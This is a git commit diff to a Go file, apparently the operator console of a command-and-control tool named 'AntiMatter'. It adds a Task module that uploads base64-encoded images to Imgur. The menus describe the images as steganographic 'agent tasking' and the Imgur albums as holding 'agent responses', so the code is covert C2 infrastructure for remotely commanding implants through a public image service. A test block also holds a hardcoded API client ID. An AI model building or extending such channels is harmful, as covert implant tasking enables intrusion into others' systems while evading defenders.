9199a2c9bb72d0de9a57a6a915015217f9faf1f0
AnubisSec <38790814+AnubisSec@users.noreply.github.com>
2020-07-12 01:14:42 -0400

    Added Task module, need to finish handling that

--- anti.go
+++ anti.go
@@ -3,11 +3,13 @@ package main
 import (
 	"bufio"
 	"bytes"
+	"encoding/base64"
 	"encoding/json"
 	"errors"
 	"fmt"
 	"image/png"
-	//"io/ioutil"
+	"io/ioutil"
+	"mime/multipart"
 	//"mime/multipart"
 	//"log"
 	"net/http"
@@ -38,13 +40,16 @@ func validateOptions(slice []string, val string) bool {
 }
 
 // Global map for the Image module
-var imageOptions = map[string]string{"Command": "", "Response": "", "BaseImage": "", "NewFilename": "", "ClientID": "", "AlbumID": ""}
+var imageOptions = map[string]string{"Command": "", "BaseImage": "", "NewFilename": "", "ClientID": "", "AlbumID": ""}
 
 // Global map for the Album module
-var albumOptions = map[string]string{"Title": "", "Client-ID": ""}
+var albumOptions = map[string]string{"Title": "", "Client-ID": "", "AlbumID": "", "Delete-Hash": ""}
+
+// Global map for the Task module
+var taskOptions = map[string]string{"TaskingImage": "", "Title": "", "Description": "", "ClientID": ""}
 
 // createImage is a function that uses the stego lib to encode an image you define and then write it to a new image
-func createImage(command string, response string, origPic string, newPic string) {
+func createImage(command string, origPic string, newPic string) {
 	inFile, _ := os.Open(origPic)
 	reader := bufio.NewReader(inFile)
 	img, _ := png.Decode(reader)
@@ -54,7 +59,7 @@ func createImage(command string, response string, origPic string, newPic string)
 	if err != nil {
 		fmt.Printf("Error encoding file %v", err)
 	} else {
-		fmt.Println(color.GreenString("[+]"), "Success creating encoded image!")
+		fmt.Println(color.GreenString("\n[+]"), "Success creating encoded image!\n")
 
 	}
 
@@ -97,6 +102,41 @@ func createAlbum(title string, clientID string) (albumID, deleteHash interface{}
 	fmt.Println(color.GreenString("albumID:"), albumID, color.GreenString("deletehash:"), deleteHash, "\n")
 
 	return albumID, deleteHash
+
+}
+
+func uploadImage(imageFile string, title string, description string, clientID string) {
+	url := "https://api.imgur.com/3/image"
+	method := "POST"
+	var params = map[string]string{"image": imageFile, "title": title, "description": description}
+
+	payload := &bytes.Buffer{}
+	writer := multipart.NewWriter(payload)
+
+	// This for loop is to send multiple multipart parameters, that are mapped above
+	for key, val := range params {
+		_ = writer.WriteField(key, val)
+	}
+
+	err := writer.Close()
+	if err != nil {
+		fmt.Println(err)
+	}
+
+	client := &http.Client{}
+	req, err := http.NewRequest(method, url, payload)
+
+	if err != nil {
+		fmt.Println(err)
+	}
+	req.Header.Add("Authorization", "Client-ID "+clientID)
+
+	req.Header.Set("Content-Type", writer.FormDataContentType())
+	res, err := client.Do(req)
+	defer res.Body.Close()
+	body, err := ioutil.ReadAll(res.Body)
+
+	fmt.Println(string(body))
 
 }
 
@@ -147,12 +187,9 @@ func main() {
 			fmt.Println("\n")
 			fmt.Println(" Image		Create an Image for agent tasking")
 			fmt.Println(" Album		Create an Album for agent responses")
-			fmt.Println(" Agent		Create an Agent entity")
 			fmt.Println(" Task		Create Tasking for agent")
 			fmt.Println(" List		List images, albums, agents, and tasks")
-			fmt.Println(" Delete		Delete images, albums, agents, and tasks")
-			fmt.Println(" Response	Retrieve Responses from tasked agents")
-			fmt.Println(" Exit/Quit	Exit program")
+			fmt.Println(" Exit		Exit program")
 			fmt.Println("")
 		}
 
@@ -170,6 +207,13 @@ func main() {
 
 				if strings.TrimRight(text, "\n") == "options" {
 					fmt.Println("\n---OPTIONS---")
+					// Check to see if this value is set from the Album module
+					if val, ok := albumOptions["Client-ID"]; ok {
+						imageOptions["ClientId"] = val
+					}
+					if val, ok := albumOptions["AlbumID"]; ok {
+						imageOptions["AlbumId"] = val
+					}
 					for key, value := range imageOptions {
 						if value == "" {
 
@@ -179,24 +223,12 @@ func main() {
 						}
 
 					}
+					fmt.Println("\n")
 				} else if strings.Contains(text, "set") {
 					if strings.Contains(text, "command") {
 						command := strings.Split(text, "command ")
 						imageOptions["Command"] = strings.Replace(strings.Join(command[1:], ""), "\n", "", -1)
 
-					} else if strings.Contains(text, "response") {
-						if strings.Contains(text, "s") {
-							imageOptions["Response"] = "Short"
-							imageOptions["ClientID"] = ""
-							imageOptions["AlbumID"] = ""
-						}
-						if strings.Contains(text, "n") {
-							imageOptions["Response"] = "No"
-						}
-						if strings.Contains(text, "l") {
-							imageOptions["Response"] = "Long"
-							imageOptions["AlbumID"] = ""
-						}
 					} else if strings.Contains(text, "base-image") {
 						baseImage := strings.Split(text, "base-image ")
 						imageOptions["BaseImage"] = strings.Replace(strings.Join(baseImage[1:], ""), "\n", "", -1)
@@ -212,7 +244,7 @@ func main() {
 					}
 
 				} else if strings.Contains(text, "go") {
-					createImage(imageOptions["Command"], imageOptions["Response"], imageOptions["BaseImage"], imageOptions["NewFilename"])
+					createImage(imageOptions["Command"], imageOptions["BaseImage"], imageOptions["NewFilename"])
 
 				} else if strings.Contains(text, "exit") {
 					break
@@ -220,12 +252,14 @@ func main() {
 
 			}
 		}
-		if strings.EqualFold(result, "testHttp") {
-			//albumID, deleteHash := createAlbum("test", "bc8c890066d6157")
-			//fmt.Println(color.GreenString("[+]"), "Successfully created an album with the following values:")
-			//fmt.Println(color.GreenString("albumID:"), albumID, color.GreenString("deletehash:"), deleteHash)
+		/*
+			if strings.EqualFold(result, "testHttp") {
+				albumID, deleteHash := createAlbum("test", "bc8c890066d6157")
+				fmt.Println(color.GreenString("[+]"), "Successfully created an album with the following values:")
+				fmt.Println(color.GreenString("albumID:"), albumID, color.GreenString("deletehash:"), deleteHash)
 
-		}
+			}
+		*/
 
 		if strings.EqualFold(result, "Album") {
 			for {
@@ -239,6 +273,15 @@ func main() {
 
 				if strings.TrimRight(text, "\n") == "options" {
 					fmt.Println("\n---OPTIONS---")
+					// Check to see if this value was set in the Image module
+					if val, ok := imageOptions["ClientId"]; ok {
+						albumOptions["Client-ID"] = val
+					}
+					// Check to see if this value was set in the Image module
+					if val, ok := imageOptions["AlbumId"]; ok {
+						albumOptions["AlbumID"] = val
+					}
+
 					for key, value := range albumOptions {
 						if value == "" {
 
@@ -248,6 +291,8 @@ func main() {
 						}
 
 					}
+
+					fmt.Println("\n")
 				} else if strings.Contains(text, "set") {
 					if strings.Contains(text, "title") {
 						title := strings.Split(text, "title ")
@@ -258,8 +303,13 @@ func main() {
 						albumOptions["Client-ID"] = strings.Replace(strings.Join(clientID[1:], ""), "\n", "", -1)
 					}
 
+				} else if strings.Contains(text, "list") {
+					fmt.Println(color.CyanString("AlbumHash:"), albumOptions["Delete-Hash"], "|", color.CyanString("Album ID:"), albumOptions["AlbumID"])
+
 				} else if strings.Contains(text, "go") {
-					createAlbum(albumOptions["Title"], albumOptions["Client-ID"])
+					albumID, deletehash := createAlbum(albumOptions["Title"], albumOptions["Client-ID"])
+					albumOptions["AlbumID"] = albumID.(string)
+					albumOptions["Delete-Hash"] = deletehash.(string)
 
 				} else if strings.Contains(text, "exit") {
 					break
@@ -268,7 +318,73 @@ func main() {
 			}
 
 		}
-		if strings.EqualFold(result, "") {
+		if strings.EqualFold(result, "Task") {
+			for {
+				reader := bufio.NewReader(os.Stdin)
+				color.Set(color.FgGreen)
+				fmt.Print("AntiMatter/Task > ")
+				color.Unset()
+				// Had to do this since case sensitivity is dumb in golang
+				initialText, _ := reader.ReadString('\n')
+				text := strings.ToLower(initialText)
+
+				if strings.TrimRight(text, "\n") == "options" {
+					fmt.Println("\n---OPTIONS---")
+
+					// Check to see if this value was set in the Image module
+					if val, ok := imageOptions["ClientId"]; ok {
+						taskOptions["ClientID"] = val
+					}
+
+					for key, value := range taskOptions {
+						if value == "" {
+
+							fmt.Println(color.CyanString(key), ": None")
+						} else {
+							fmt.Println(color.CyanString(key), ":", value)
+						}
+
+					}
+					fmt.Println("\n")
+					// var taskOptions = map[string]string{"TaskingImage": "", "Title": "", "Description": "", "ClientID": ""}
+					// func uploadImage(imageFile string, title string, description string, clientID string)
+				} else if strings.Contains(text, "set") {
+					if strings.Contains(text, "title") {
+						taskTitle := strings.Split(text, "title ")
+						taskOptions["Title"] = strings.Replace(strings.Join(taskTitle[1:], ""), "\n", "", -1)
+
+					} else if strings.Contains(text, "tasking-image") {
+
+						taskImage := strings.Split(text, "tasking-image ")
+
+						// Open local image file
+						f, _ := os.Open("./" + strings.Replace(strings.Join(taskImage[1:], ""), "\n", "", -1))
+
+						reader := bufio.NewReader(f)
+						content, _ := ioutil.ReadAll(reader)
+						// Convert image file data to base64
+						encoded := base64.StdEncoding.EncodeToString(content)
+						taskOptions["TaskingImage"] = encoded
+
+					} else if strings.Contains(text, "description") {
+						taskDescrip := strings.Split(text, "description ")
+						taskOptions["Description"] = strings.Replace(strings.Join(taskDescrip[1:], ""), "\n", "", -1)
+
+					} else if strings.Contains(text, "client-id") {
+						clientID := strings.Split(text, "client-id ")
+						taskOptions["ClientID"] = strings.Replace(strings.Join(clientID[1:], ""), "\n", "", -1)
+
+					}
+
+				} else if strings.Contains(text, "go") {
+					uploadImage(taskOptions["TaskingImage"], taskOptions["Title"], taskOptions["Description"], taskOptions["ClientID"])
+
+				} else if strings.Contains(text, "exit") {
+					break
+				}
+
+			}
+
 		}
 		if strings.EqualFold(result, "") {
 		}
